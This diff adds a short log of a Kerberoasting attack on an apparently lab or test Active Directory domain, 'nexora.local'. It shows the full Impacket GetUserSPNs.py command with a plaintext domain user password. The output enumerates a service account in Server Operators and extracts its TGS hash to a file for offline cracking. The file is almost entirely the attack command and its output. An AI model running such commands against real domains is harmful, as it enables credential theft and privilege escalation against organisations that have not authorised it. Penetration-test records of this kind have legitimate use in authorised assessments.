@@ -1,0 +1,16 @@
+[+] Kerberoasting — SPN Enumeration & Ticket Capture Log
+Timestamp: 2026-10-18 14:15:44 UTC
+Tool: Impacket v0.11.0 GetUserSPNs.py
+DC Target: 10.10.10.20 (Nexora-DC01.nexora.local)
+
+$ GetUserSPNs.py nexora.local/jsmith:Password123! -dc-ip 10.10.10.20 -request
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+ServicePrincipalName                             Name      MemberOf
+------------------------------------------------ --------- -------------------------------
+MSSQLSvc/Nexora-SRV-APP01.nexora.local:1433      svc-sql   CN=Server Operators,CN=Builtin...
+
+[*] Requesting TGS for SPN: MSSQLSvc/Nexora-SRV-APP01.nexora.local:1433
+[*] Hash format: $krb5tgs$23$*svc-sql$nexora.local$MSSQLSvc/Nexora-SRV-APP01.nexora.local:1433*...
+[*] Extracted 1 Kerberos TGS-REP hash (etype 23 - RC4-HMAC)
+[*] Ticket written to kerberoast_hashes.txt
